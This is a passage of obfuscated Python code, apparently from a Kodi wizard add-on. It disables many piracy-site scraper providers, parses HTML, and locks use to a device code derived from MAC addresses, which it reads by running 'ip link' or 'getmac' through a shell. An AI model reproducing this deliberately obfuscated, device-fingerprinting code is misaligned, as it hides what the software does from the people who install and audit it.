		O00O0000000O00000 .setSetting ('all_t','0')#line:1213
		O00O0000000O00000 .setSetting ('rd_menu_enable','false')#line:1214
		O00O0000000O00000 .setSetting ('magnet_bay','false')#line:1215
		O00O0000000O00000 .setSetting ('magnet_extra','false')#line:1216
		O00O0000000O00000 .setSetting ('rd_only','false')#line:1217
		O00O0000000O00000 .setSetting ('ftp','false')#line:1219
		O00O0000000O00000 .setSetting ('fp','false')#line:1220
		O00O0000000O00000 .setSetting ('filter_fp','false')#line:1221
		O00O0000000O00000 .setSetting ('fp_size_en','false')#line:1222
		O00O0000000O00000 .setSetting ('afdah','false')#line:1223
		O00O0000000O00000 .setSetting ('ap2s','false')#line:1224
		O00O0000000O00000 .setSetting ('cin','false')#line:1225
		O00O0000000O00000 .setSetting ('clv','false')#line:1226
		O00O0000000O00000 .setSetting ('cmv','false')#line:1227
		O00O0000000O00000 .setSetting ('dl20','false')#line:1228
		O00O0000000O00000 .setSetting ('esc','false')#line:1229
		O00O0000000O00000 .setSetting ('extra','false')#line:1230
		O00O0000000O00000 .setSetting ('film','false')#line:1231
		O00O0000000O00000 .setSetting ('fre','false')#line:1232
		O00O0000000O00000 .setSetting ('fxy','false')#line:1233
		O00O0000000O00000 .setSetting ('genv','false')#line:1234
		O00O0000000O00000 .setSetting ('getgo','false')#line:1235
		O00O0000000O00000 .setSetting ('gold','false')#line:1236
		O00O0000000O00000 .setSetting ('gona','false')#line:1237
		O00O0000000O00000 .setSetting ('hdmm','false')#line:1238
		O00O0000000O00000 .setSetting ('hdt','false')#line:1239
		O00O0000000O00000 .setSetting ('icy','false')#line:1240
		O00O0000000O00000 .setSetting ('ind','false')#line:1241
		O00O0000000O00000 .setSetting ('iwi','false')#line:1242
		O00O0000000O00000 .setSetting ('jen_free','false')#line:1243
		O00O0000000O00000 .setSetting ('kiss','false')#line:1244
		O00O0000000O00000 .setSetting ('lavin','false')#line:1245
		O00O0000000O00000 .setSetting ('los','false')#line:1246
		O00O0000000O00000 .setSetting ('m4u','false')#line:1247
		O00O0000000O00000 .setSetting ('mesh','false')#line:1248
		O00O0000000O00000 .setSetting ('mf','false')#line:1249
		O00O0000000O00000 .setSetting ('mkvc','false')#line:1250
		O00O0000000O00000 .setSetting ('mjy','false')#line:1251
		O00O0000000O00000 .setSetting ('hdonline','false')#line:1252
		O00O0000000O00000 .setSetting ('moviex','false')#line:1253
		O00O0000000O00000 .setSetting ('mpr','false')#line:1254
		O00O0000000O00000 .setSetting ('mvg','false')#line:1255
		O00O0000000O00000 .setSetting ('mvl','false')#line:1256
		O00O0000000O00000 .setSetting ('mvs','false')#line:1257
		O00O0000000O00000 .setSetting ('myeg','false')#line:1258
		O00O0000000O00000 .setSetting ('ninja','false')#line:1259
		O00O0000000O00000 .setSetting ('odb','false')#line:1260
		O00O0000000O00000 .setSetting ('ophd','false')#line:1261
		O00O0000000O00000 .setSetting ('pks','false')#line:1262
		O00O0000000O00000 .setSetting ('prf','false')#line:1263
		O00O0000000O00000 .setSetting ('put18','false')#line:1264
		O00O0000000O00000 .setSetting ('req','false')#line:1265
		O00O0000000O00000 .setSetting ('rftv','false')#line:1266
		O00O0000000O00000 .setSetting ('rltv','false')#line:1267
		O00O0000000O00000 .setSetting ('sc','false')#line:1268
		O00O0000000O00000 .setSetting ('seehd','false')#line:1269
		O00O0000000O00000 .setSetting ('showbox','false')#line:1270
		O00O0000000O00000 .setSetting ('shuid','false')#line:1271
		O00O0000000O00000 .setSetting ('sil_gh','false')#line:1272
		O00O0000000O00000 .setSetting ('spv','false')#line:1273
		O00O0000000O00000 .setSetting ('subs','false')#line:1274
		O00O0000000O00000 .setSetting ('tvs','false')#line:1275
		O00O0000000O00000 .setSetting ('tw','false')#line:1276
		O00O0000000O00000 .setSetting ('upto','false')#line:1277
		O00O0000000O00000 .setSetting ('vel','false')#line:1278
		O00O0000000O00000 .setSetting ('vex','false')#line:1279
		O00O0000000O00000 .setSetting ('vidc','false')#line:1280
		O00O0000000O00000 .setSetting ('w4hd','false')#line:1281
		O00O0000000O00000 .setSetting ('wav','false')#line:1282
		O00O0000000O00000 .setSetting ('wf','false')#line:1283
		O00O0000000O00000 .setSetting ('wse','false')#line:1284
		O00O0000000O00000 .setSetting ('wss','false')#line:1285
		O00O0000000O00000 .setSetting ('wsse','false')#line:1286
		O00O0000000O00000 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1287
		O00O0000000O00000 .setSetting ('debrid.only','true')#line:1288
		O00O0000000O00000 .setSetting ('hosts.captcha','false')#line:1289
		O00O0000000O00000 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1290
		O00O0000000O00000 .setSetting ('provider.123moviehd','false')#line:1291
		O00O0000000O00000 .setSetting ('provider.300mbdownload','false')#line:1292
		O00O0000000O00000 .setSetting ('provider.alltube','false')#line:1293
		O00O0000000O00000 .setSetting ('provider.allucde','false')#line:1294
		O00O0000000O00000 .setSetting ('provider.animebase','false')#line:1295
		O00O0000000O00000 .setSetting ('provider.animeloads','false')#line:1296
		O00O0000000O00000 .setSetting ('provider.animetoon','false')#line:1297
		O00O0000000O00000 .setSetting ('provider.bnwmovies','false')#line:1298
		O00O0000000O00000 .setSetting ('provider.boxfilm','false')#line:1299
		O00O0000000O00000 .setSetting ('provider.bs','false')#line:1300
		O00O0000000O00000 .setSetting ('provider.cartoonhd','false')#line:1301
		O00O0000000O00000 .setSetting ('provider.cdahd','false')#line:1302
		O00O0000000O00000 .setSetting ('provider.cdax','false')#line:1303
		O00O0000000O00000 .setSetting ('provider.cine','false')#line:1304
		O00O0000000O00000 .setSetting ('provider.cinenator','false')#line:1305
		O00O0000000O00000 .setSetting ('provider.cmovieshdbz','false')#line:1306
		O00O0000000O00000 .setSetting ('provider.coolmoviezone','false')#line:1307
		O00O0000000O00000 .setSetting ('provider.ddl','false')#line:1308
		O00O0000000O00000 .setSetting ('provider.deepmovie','false')#line:1309
		O00O0000000O00000 .setSetting ('provider.ekinomaniak','false')#line:1310
		O00O0000000O00000 .setSetting ('provider.ekinotv','false')#line:1311
		O00O0000000O00000 .setSetting ('provider.filiser','false')#line:1312
		O00O0000000O00000 .setSetting ('provider.filmpalast','false')#line:1313
		O00O0000000O00000 .setSetting ('provider.filmwebbooster','false')#line:1314
		O00O0000000O00000 .setSetting ('provider.filmxy','false')#line:1315
		O00O0000000O00000 .setSetting ('provider.fmovies','false')#line:1316
		O00O0000000O00000 .setSetting ('provider.foxx','false')#line:1317
		O00O0000000O00000 .setSetting ('provider.freefmovies','false')#line:1318
		O00O0000000O00000 .setSetting ('provider.freeputlocker','false')#line:1319
		O00O0000000O00000 .setSetting ('provider.furk','false')#line:1320
		O00O0000000O00000 .setSetting ('provider.gamatotv','false')#line:1321
		O00O0000000O00000 .setSetting ('provider.gogoanime','false')#line:1322
		O00O0000000O00000 .setSetting ('provider.gowatchseries','false')#line:1323
		O00O0000000O00000 .setSetting ('provider.hackimdb','false')#line:1324
		O00O0000000O00000 .setSetting ('provider.hdfilme','false')#line:1325
		O00O0000000O00000 .setSetting ('provider.hdmto','false')#line:1326
		O00O0000000O00000 .setSetting ('provider.hdpopcorns','false')#line:1327
		O00O0000000O00000 .setSetting ('provider.hdstreams','false')#line:1328
		O00O0000000O00000 .setSetting ('provider.horrorkino','false')#line:1330
		O00O0000000O00000 .setSetting ('provider.iitv','false')#line:1331
		O00O0000000O00000 .setSetting ('provider.iload','false')#line:1332
		O00O0000000O00000 .setSetting ('provider.iwaatch','false')#line:1333
		O00O0000000O00000 .setSetting ('provider.kinodogs','false')#line:1334
		O00O0000000O00000 .setSetting ('provider.kinoking','false')#line:1335
		O00O0000000O00000 .setSetting ('provider.kinow','false')#line:1336
		O00O0000000O00000 .setSetting ('provider.kinox','false')#line:1337
		O00O0000000O00000 .setSetting ('provider.lichtspielhaus','false')#line:1338
		O00O0000000O00000 .setSetting ('provider.liomenoi','false')#line:1339
		O00O0000000O00000 .setSetting ('provider.magnetdl','false')#line:1342
		O00O0000000O00000 .setSetting ('provider.megapelistv','false')#line:1343
		O00O0000000O00000 .setSetting ('provider.movie2k-ac','false')#line:1344
		O00O0000000O00000 .setSetting ('provider.movie2k-ag','false')#line:1345
		O00O0000000O00000 .setSetting ('provider.movie2z','false')#line:1346
		O00O0000000O00000 .setSetting ('provider.movie4k','false')#line:1347
		O00O0000000O00000 .setSetting ('provider.movie4kis','false')#line:1348
		O00O0000000O00000 .setSetting ('provider.movieneo','false')#line:1349
		O00O0000000O00000 .setSetting ('provider.moviesever','false')#line:1350
		O00O0000000O00000 .setSetting ('provider.movietown','false')#line:1351
		O00O0000000O00000 .setSetting ('provider.mvrls','false')#line:1353
		O00O0000000O00000 .setSetting ('provider.netzkino','false')#line:1354
		O00O0000000O00000 .setSetting ('provider.odb','false')#line:1355
		O00O0000000O00000 .setSetting ('provider.openkatalog','false')#line:1356
		O00O0000000O00000 .setSetting ('provider.ororo','false')#line:1357
		O00O0000000O00000 .setSetting ('provider.paczamy','false')#line:1358
		O00O0000000O00000 .setSetting ('provider.peliculasdk','false')#line:1359
		O00O0000000O00000 .setSetting ('provider.pelisplustv','false')#line:1360
		O00O0000000O00000 .setSetting ('provider.pepecine','false')#line:1361
		O00O0000000O00000 .setSetting ('provider.primewire','false')#line:1362
		O00O0000000O00000 .setSetting ('provider.projectfreetv','false')#line:1363
		O00O0000000O00000 .setSetting ('provider.proxer','false')#line:1364
		O00O0000000O00000 .setSetting ('provider.pureanime','false')#line:1365
		O00O0000000O00000 .setSetting ('provider.putlocker','false')#line:1366
		O00O0000000O00000 .setSetting ('provider.putlockerfree','false')#line:1367
		O00O0000000O00000 .setSetting ('provider.reddit','false')#line:1368
		O00O0000000O00000 .setSetting ('provider.cartoonwire','false')#line:1369
		O00O0000000O00000 .setSetting ('provider.seehd','false')#line:1370
		O00O0000000O00000 .setSetting ('provider.segos','false')#line:1371
		O00O0000000O00000 .setSetting ('provider.serienstream','false')#line:1372
		O00O0000000O00000 .setSetting ('provider.series9','false')#line:1373
		O00O0000000O00000 .setSetting ('provider.seriesever','false')#line:1374
		O00O0000000O00000 .setSetting ('provider.seriesonline','false')#line:1375
		O00O0000000O00000 .setSetting ('provider.seriespapaya','false')#line:1376
		O00O0000000O00000 .setSetting ('provider.sezonlukdizi','false')#line:1377
		O00O0000000O00000 .setSetting ('provider.solarmovie','false')#line:1378
		O00O0000000O00000 .setSetting ('provider.solarmoviez','false')#line:1379
		O00O0000000O00000 .setSetting ('provider.stream-to','false')#line:1380
		O00O0000000O00000 .setSetting ('provider.streamdream','false')#line:1381
		O00O0000000O00000 .setSetting ('provider.streamflix','false')#line:1382
		O00O0000000O00000 .setSetting ('provider.streamit','false')#line:1383
		O00O0000000O00000 .setSetting ('provider.swatchseries','false')#line:1384
		O00O0000000O00000 .setSetting ('provider.szukajkatv','false')#line:1385
		O00O0000000O00000 .setSetting ('provider.tainiesonline','false')#line:1386
		O00O0000000O00000 .setSetting ('provider.tainiomania','false')#line:1387
		O00O0000000O00000 .setSetting ('provider.tata','false')#line:1390
		O00O0000000O00000 .setSetting ('provider.trt','false')#line:1391
		O00O0000000O00000 .setSetting ('provider.tvbox','false')#line:1392
		O00O0000000O00000 .setSetting ('provider.ultrahd','false')#line:1393
		O00O0000000O00000 .setSetting ('provider.video4k','false')#line:1394
		O00O0000000O00000 .setSetting ('provider.vidics','false')#line:1395
		O00O0000000O00000 .setSetting ('provider.view4u','false')#line:1396
		O00O0000000O00000 .setSetting ('provider.watchseries','false')#line:1397
		O00O0000000O00000 .setSetting ('provider.xrysoi','false')#line:1398
		O00O0000000O00000 .setSetting ('provider.library','false')#line:1399
def fixfont ():#line:1402
	O0OO00O00O0OOO0O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1403
	O0O0O000000OOOOOO =json .loads (O0OO00O00O0OOO0O0 );#line:1405
	OO0O0O0O00O0OO0OO =O0O0O000000OOOOOO ["result"]["settings"]#line:1406
	O0OOOOOO0O000O000 =[OOOO000OOO0O000OO for OOOO000OOO0O000OO in OO0O0O0O00O0OO0OO if OOOO000OOO0O000OO ["id"]=="audiooutput.audiodevice"][0 ]#line:1408
	O0O00OO0O0OOOOOOO =O0OOOOOO0O000O000 ["options"];#line:1409
	O00OO00OOOOOOOO00 =O0OOOOOO0O000O000 ["value"];#line:1410
	O000O0OOOO0OOOOOO =[OO00OO00OOO00O00O for (OO00OO00OOO00O00O ,O00OO000OO00O0O0O )in enumerate (O0O00OO0O0OOOOOOO )if O00OO000OO00O0O0O ["value"]==O00OO00OOOOOOOO00 ][0 ];#line:1412
	O000OOOOO000O0000 =(O000O0OOOO0OOOOOO +1 )%len (O0O00OO0O0OOOOOOO )#line:1414
	O000000OOO0OO0OO0 =O0O00OO0O0OOOOOOO [O000OOOOO000O0000 ]["value"]#line:1416
	OOO0000OO0O0O000O =O0O00OO0O0OOOOOOO [O000OOOOO000O0000 ]["label"]#line:1417
	O0O0O00OOO0OOOOOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1419
	try :#line:1421
		O000O0OOOOO0000O0 =json .loads (O0O0O00OOO0OOOOOO );#line:1422
		if O000O0OOOOO0000O0 ["result"]!=True :#line:1424
			raise Exception #line:1425
	except :#line:1426
		sys .stderr .write ("Error switching audio output device")#line:1427
		raise Exception #line:1428
def parseDOM2 (O0O00OO000O00O00O ,name =u"",attrs ={},ret =False ):#line:1429
	if isinstance (O0O00OO000O00O00O ,str ):#line:1432
		try :#line:1433
			O0O00OO000O00O00O =[O0O00OO000O00O00O .decode ("utf-8")]#line:1434
		except :#line:1435
			O0O00OO000O00O00O =[O0O00OO000O00O00O ]#line:1436
	elif isinstance (O0O00OO000O00O00O ,unicode ):#line:1437
		O0O00OO000O00O00O =[O0O00OO000O00O00O ]#line:1438
	elif not isinstance (O0O00OO000O00O00O ,list ):#line:1439
		return u""#line:1440
	if not name .strip ():#line:1442
		return u""#line:1443
	OOO00000000O0000O =[]#line:1445
	for OO0O0O00OOO0000O0 in O0O00OO000O00O00O :#line:1446
		O00OO00O0O000OO0O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO0O0O00OOO0000O0 )#line:1447
		for O0OOO00000O000000 in O00OO00O0O000OO0O :#line:1448
			OO0O0O00OOO0000O0 =OO0O0O00OOO0000O0 .replace (O0OOO00000O000000 ,O0OOO00000O000000 .replace ("\n"," "))#line:1449
		OO0OOO0000O000000 =[]#line:1451
		for O0O0OOO000OOOO0O0 in attrs :#line:1452
			OOO0O0O0O000OOOOO =re .compile ('(<'+name +'[^>]*?(?:'+O0O0OOO000OOOO0O0 +'=[\'"]'+attrs [O0O0OOO000OOOO0O0 ]+'[\'"].*?>))',re .M |re .S ).findall (OO0O0O00OOO0000O0 )#line:1453
			if len (OOO0O0O0O000OOOOO )==0 and attrs [O0O0OOO000OOOO0O0 ].find (" ")==-1 :#line:1454
				OOO0O0O0O000OOOOO =re .compile ('(<'+name +'[^>]*?(?:'+O0O0OOO000OOOO0O0 +'='+attrs [O0O0OOO000OOOO0O0 ]+'.*?>))',re .M |re .S ).findall (OO0O0O00OOO0000O0 )#line:1455
			if len (OO0OOO0000O000000 )==0 :#line:1457
				OO0OOO0000O000000 =OOO0O0O0O000OOOOO #line:1458
				OOO0O0O0O000OOOOO =[]#line:1459
			else :#line:1460
				O0000OO000OO0OO0O =range (len (OO0OOO0000O000000 ))#line:1461
				O0000OO000OO0OO0O .reverse ()#line:1462
				for O000OO0O0000OO00O in O0000OO000OO0OO0O :#line:1463
					if not OO0OOO0000O000000 [O000OO0O0000OO00O ]in OOO0O0O0O000OOOOO :#line:1464
						del (OO0OOO0000O000000 [O000OO0O0000OO00O ])#line:1465
		if len (OO0OOO0000O000000 )==0 and attrs =={}:#line:1467
			OO0OOO0000O000000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO0O0O00OOO0000O0 )#line:1468
			if len (OO0OOO0000O000000 )==0 :#line:1469
				OO0OOO0000O000000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO0O0O00OOO0000O0 )#line:1470
		if isinstance (ret ,str ):#line:1472
			OOO0O0O0O000OOOOO =[]#line:1473
			for O0OOO00000O000000 in OO0OOO0000O000000 :#line:1474
				OOOOO00000OO00OO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0OOO00000O000000 )#line:1475
				if len (OOOOO00000OO00OO0 )==0 :#line:1476
					OOOOO00000OO00OO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0OOO00000O000000 )#line:1477
				for O000OO00O0O00O0O0 in OOOOO00000OO00OO0 :#line:1478
					O0000O000OOO0000O =O000OO00O0O00O0O0 [0 ]#line:1479
					if O0000O000OOO0000O in "'\"":#line:1480
						if O000OO00O0O00O0O0 .find ('='+O0000O000OOO0000O ,O000OO00O0O00O0O0 .find (O0000O000OOO0000O ,1 ))>-1 :#line:1481
							O000OO00O0O00O0O0 =O000OO00O0O00O0O0 [:O000OO00O0O00O0O0 .find ('='+O0000O000OOO0000O ,O000OO00O0O00O0O0 .find (O0000O000OOO0000O ,1 ))]#line:1482
						if O000OO00O0O00O0O0 .rfind (O0000O000OOO0000O ,1 )>-1 :#line:1484
							O000OO00O0O00O0O0 =O000OO00O0O00O0O0 [1 :O000OO00O0O00O0O0 .rfind (O0000O000OOO0000O )]#line:1485
					else :#line:1486
						if O000OO00O0O00O0O0 .find (" ")>0 :#line:1487
							O000OO00O0O00O0O0 =O000OO00O0O00O0O0 [:O000OO00O0O00O0O0 .find (" ")]#line:1488
						elif O000OO00O0O00O0O0 .find ("/")>0 :#line:1489
							O000OO00O0O00O0O0 =O000OO00O0O00O0O0 [:O000OO00O0O00O0O0 .find ("/")]#line:1490
						elif O000OO00O0O00O0O0 .find (">")>0 :#line:1491
							O000OO00O0O00O0O0 =O000OO00O0O00O0O0 [:O000OO00O0O00O0O0 .find (">")]#line:1492
					OOO0O0O0O000OOOOO .append (O000OO00O0O00O0O0 .strip ())#line:1494
			OO0OOO0000O000000 =OOO0O0O0O000OOOOO #line:1495
		else :#line:1496
			OOO0O0O0O000OOOOO =[]#line:1497
			for O0OOO00000O000000 in OO0OOO0000O000000 :#line:1498
				O0O0000000OOOOO00 =u"</"+name #line:1499
				O00OO0OOOOO0O00OO =OO0O0O00OOO0000O0 .find (O0OOO00000O000000 )#line:1501
				O00O00O00O0OO0O00 =OO0O0O00OOO0000O0 .find (O0O0000000OOOOO00 ,O00OO0OOOOO0O00OO )#line:1502
				OOOOO0OOO0OOO0OOO =OO0O0O00OOO0000O0 .find ("<"+name ,O00OO0OOOOO0O00OO +1 )#line:1503
				while OOOOO0OOO0OOO0OOO <O00O00O00O0OO0O00 and OOOOO0OOO0OOO0OOO !=-1 :#line:1505
					OO00O00OOO00000O0 =OO0O0O00OOO0000O0 .find (O0O0000000OOOOO00 ,O00O00O00O0OO0O00 +len (O0O0000000OOOOO00 ))#line:1506
					if OO00O00OOO00000O0 !=-1 :#line:1507
						O00O00O00O0OO0O00 =OO00O00OOO00000O0 #line:1508
					OOOOO0OOO0OOO0OOO =OO0O0O00OOO0000O0 .find ("<"+name ,OOOOO0OOO0OOO0OOO +1 )#line:1509
				if O00OO0OOOOO0O00OO ==-1 and O00O00O00O0OO0O00 ==-1 :#line:1511
					O00O0OO0OO00000O0 =u""#line:1512
				elif O00OO0OOOOO0O00OO >-1 and O00O00O00O0OO0O00 >-1 :#line:1513
					O00O0OO0OO00000O0 =OO0O0O00OOO0000O0 [O00OO0OOOOO0O00OO +len (O0OOO00000O000000 ):O00O00O00O0OO0O00 ]#line:1514
				elif O00O00O00O0OO0O00 >-1 :#line:1515
					O00O0OO0OO00000O0 =OO0O0O00OOO0000O0 [:O00O00O00O0OO0O00 ]#line:1516
				elif O00OO0OOOOO0O00OO >-1 :#line:1517
					O00O0OO0OO00000O0 =OO0O0O00OOO0000O0 [O00OO0OOOOO0O00OO +len (O0OOO00000O000000 ):]#line:1518
				if ret :#line:1520
					O0O0000000OOOOO00 =OO0O0O00OOO0000O0 [O00O00O00O0OO0O00 :OO0O0O00OOO0000O0 .find (">",OO0O0O00OOO0000O0 .find (O0O0000000OOOOO00 ))+1 ]#line:1521
					O00O0OO0OO00000O0 =O0OOO00000O000000 +O00O0OO0OO00000O0 +O0O0000000OOOOO00 #line:1522
				OO0O0O00OOO0000O0 =OO0O0O00OOO0000O0 [OO0O0O00OOO0000O0 .find (O00O0OO0OO00000O0 ,OO0O0O00OOO0000O0 .find (O0OOO00000O000000 ))+len (O00O0OO0OO00000O0 ):]#line:1524
				OOO0O0O0O000OOOOO .append (O00O0OO0OO00000O0 )#line:1525
			OO0OOO0000O000000 =OOO0O0O0O000OOOOO #line:1526
		OOO00000000O0000O +=OO0OOO0000O000000 #line:1527
	return OOO00000000O0000O #line:1529
def addItem (OO0O00OOOOO000000 ,OO000O0O0OO000000 ,OOO0O0OO0O0000O0O ,O0O000000OO0OO0O0 ,OO0OOO0OO00O0OO0O ,description =None ):#line:1531
	if description ==None :description =''#line:1532
	description ='[COLOR white]'+description +'[/COLOR]'#line:1533
	OO0OO000O0OOOOOOO =sys .argv [0 ]+"?url="+urllib .quote_plus (OO000O0O0OO000000 )+"&mode="+str (OOO0O0OO0O0000O0O )+"&name="+urllib .quote_plus (OO0O00OOOOO000000 )+"&iconimage="+urllib .quote_plus (O0O000000OO0OO0O0 )+"&fanart="+urllib .quote_plus (OO0OOO0OO00O0OO0O )#line:1534
	O00OOO0OOO00OOOO0 =True #line:1535
	O0000OO0O000OO0OO =xbmcgui .ListItem (OO0O00OOOOO000000 ,iconImage =O0O000000OO0OO0O0 ,thumbnailImage =O0O000000OO0OO0O0 )#line:1536
	O0000OO0O000OO0OO .setInfo (type ="Video",infoLabels ={"Title":OO0O00OOOOO000000 ,"Plot":description })#line:1537
	O0000OO0O000OO0OO .setProperty ("fanart_Image",OO0OOO0OO00O0OO0O )#line:1538
	O0000OO0O000OO0OO .setProperty ("icon_Image",O0O000000OO0OO0O0 )#line:1539
	O00OOO0OOO00OOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OO000O0OOOOOOO ,listitem =O0000OO0O000OO0OO ,isFolder =False )#line:1540
	return O00OOO0OOO00OOOO0 #line:1541
def get_params ():#line:1543
		O0OO0OOOOO0OO0000 =[]#line:1544
		O0O0OO0000O000OO0 =sys .argv [2 ]#line:1545
		if len (O0O0OO0000O000OO0 )>=2 :#line:1546
				OO0O0OOOOO00O00OO =sys .argv [2 ]#line:1547
				O0O0O00O0OOO0OOOO =OO0O0OOOOO00O00OO .replace ('?','')#line:1548
				if (OO0O0OOOOO00O00OO [len (OO0O0OOOOO00O00OO )-1 ]=='/'):#line:1549
						OO0O0OOOOO00O00OO =OO0O0OOOOO00O00OO [0 :len (OO0O0OOOOO00O00OO )-2 ]#line:1550
				O00O0O000O0OO0000 =O0O0O00O0OOO0OOOO .split ('&')#line:1551
				O0OO0OOOOO0OO0000 ={}#line:1552
				for O000OOOOO0OOOO00O in range (len (O00O0O000O0OO0000 )):#line:1553
						OOOOO000OOO0OOOOO ={}#line:1554
						OOOOO000OOO0OOOOO =O00O0O000O0OO0000 [O000OOOOO0OOOO00O ].split ('=')#line:1555
						if (len (OOOOO000OOO0OOOOO ))==2 :#line:1556
								O0OO0OOOOO0OO0000 [OOOOO000OOO0OOOOO [0 ]]=OOOOO000OOO0OOOOO [1 ]#line:1557
		return O0OO0OOOOO0OO0000 #line:1559
def decode (O0OOOO0OOO00OOO0O ,OO0O0OO000O0O000O ):#line:1564
    import base64 #line:1565
    O0O0OO00O0O000OO0 =[]#line:1566
    if (len (O0OOOO0OOO00OOO0O ))!=4 :#line:1568
     return 10 #line:1569
    OO0O0OO000O0O000O =base64 .urlsafe_b64decode (OO0O0OO000O0O000O )#line:1570
    for O0O0OOO0OOO00O000 in range (len (OO0O0OO000O0O000O )):#line:1572
        OOO0OO0OO0O0OO000 =O0OOOO0OOO00OOO0O [O0O0OOO0OOO00O000 %len (O0OOOO0OOO00OOO0O )]#line:1573
        OOO0OOOOO0OO0O000 =chr ((256 +ord (OO0O0OO000O0O000O [O0O0OOO0OOO00O000 ])-ord (OOO0OO0OO0O0OO000 ))%256 )#line:1574
        O0O0OO00O0O000OO0 .append (OOO0OOOOO0OO0O000 )#line:1575
    return "".join (O0O0OO00O0O000OO0 )#line:1576
def tmdb_list (OO0O00000OOO00OO0 ):#line:1577
    OOOOOOOOO00OOOO0O =decode ("7643",OO0O00000OOO00OO0 )#line:1580
    return int (OOOOOOOOO00OOOO0O )#line:1583
def u_list (O00OOO00O00O0OO00 ):#line:1584
    from math import sqrt #line:1586
    OOO0OOOOOOOOOO0O0 =tmdb_list (TMDB_NEW_API )#line:1587
    O00OOOOOO0OO00O00 =str ((getHwAddr ('eth0'))*OOO0OOOOOOOOOO0O0 )#line:1589
    O0O000OOO0OO00O00 =int (O00OOOOOO0OO00O00 [1 ]+O00OOOOOO0OO00O00 [2 ]+O00OOOOOO0OO00O00 [5 ]+O00OOOOOO0OO00O00 [7 ])#line:1590
    O0O000000000OO0OO =(ADDON .getSetting ("pass"))#line:1592
    OOO0O00OO0O00O0OO =(str (round (sqrt ((O0O000OOO0OO00O00 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1597
    if '.'in OOO0O00OO0O00O0OO :#line:1598
     OOO0O00OO0O00O0OO =(str (round (sqrt ((O0O000OOO0OO00O00 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1599
    if O0O000000000OO0OO ==OOO0O00OO0O00O0OO :#line:1601
      O0OO00OO00O00O0OO =O00OOO00O00O0OO00 #line:1603
    else :#line:1605
       if STARTP2 ()and STARTP ()=='ok':#line:1606
         return O00OOO00O00O0OO00 #line:1609
       O0OO00OO00O00O0OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1610
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1611
       sys .exit ()#line:1612
    return O0OO00OO00O00O0OO #line:1613
def disply_hwr ():#line:1616
   try :#line:1617
    O0O00O0OOOOOO0OOO =tmdb_list (TMDB_NEW_API )#line:1618
    OO0OO0O0OO00O0OO0 =str ((getHwAddr ('eth0'))*O0O00O0OOOOOO0OOO )#line:1619
    O0O000O0OOO000000 =(OO0OO0O0OO00O0OO0 [1 ]+OO0OO0O0OO00O0OO0 [2 ]+OO0OO0O0OO00O0OO0 [5 ]+OO0OO0O0OO00O0OO0 [7 ])#line:1626
    O0OOO0O00O0O00OO0 =(ADDON .getSetting ("action"))#line:1627
    wiz .setS ('action',str (O0O000O0OOO000000 ))#line:1629
   except :pass #line:1630
def disply_hwr2 ():#line:1631
   try :#line:1632
    OO00O0OOO0OOOO000 =tmdb_list (TMDB_NEW_API )#line:1633
    O000O0000OO0OOO00 =str ((getHwAddr ('eth0'))*OO00O0OOO0OOOO000 )#line:1635
    OO0OO0000O0O0O0OO =(O000O0000OO0OOO00 [1 ]+O000O0000OO0OOO00 [2 ]+O000O0000OO0OOO00 [5 ]+O000O0000OO0OOO00 [7 ])#line:1644
    OOOO000O0O0OO0000 =(ADDON .getSetting ("action"))#line:1645
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO0OO0000O0O0O0OO )#line:1648
   except :pass #line:1649
def getHwAddr (O0OO00O0O000O00OO ):#line:1651
   import subprocess ,time #line:1652
   OOO0OO000OOO00O0O ='windows'#line:1653
   if xbmc .getCondVisibility ('system.platform.android'):#line:1654
       OOO0OO000OOO00O0O ='android'#line:1655
   if xbmc .getCondVisibility ('system.platform.android'):#line:1656
     OOO0OOO0O0OO0O00O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1657
     OOO00OO0OOOOO000O =re .compile ('link/ether (.+?) brd').findall (str (OOO0OOO0O0OO0O00O ))#line:1659
     OO0OO0OO0000OOO00 =0 #line:1660
     for O0OOO0O00000OOO0O in OOO00OO0OOOOO000O :#line:1661
      if OOO00OO0OOOOO000O !='00:00:00:00:00:00':#line:1662
          OO00OOO00OOOOOO00 =O0OOO0O00000OOO0O #line:1663
          OO0OO0OO0000OOO00 =OO0OO0OO0000OOO00 +int (OO00OOO00OOOOOO00 .replace (':',''),16 )#line:1664
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1666
       O0O0O0O00O0O00O0O =0 #line:1667
       OO0OO0OO0000OOO00 =0 #line:1668
       OOO0000000O00O0O0 =[]#line:1669
       O0OO0OO0OOOOO0OOO =os .popen ("getmac").read ()#line:1670
       O0OO0OO0OOOOO0OOO =O0OO0OO0OOOOO0OOO .split ("\n")#line:1671
       for OO00OOOO0OO0O0OOO in O0OO0OO0OOOOO0OOO :#line:1673
            O00O000000OOO00OO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO00OOOO0OO0O0OOO ,re .I )#line:1674
            if O00O000000OOO00OO :#line:1675
                OOO00OO0OOOOO000O =O00O000000OOO00OO .group ().replace ('-',':')#line:1676
                OOO0000000O00O0O0 .append (OOO00OO0OOOOO000O )#line:1677
                OO0OO0OO0000OOO00 =OO0OO0OO0000OOO00 +int (OOO00OO0OOOOO000O .replace (':',''),16 )#line:1680
   else :#line:1682
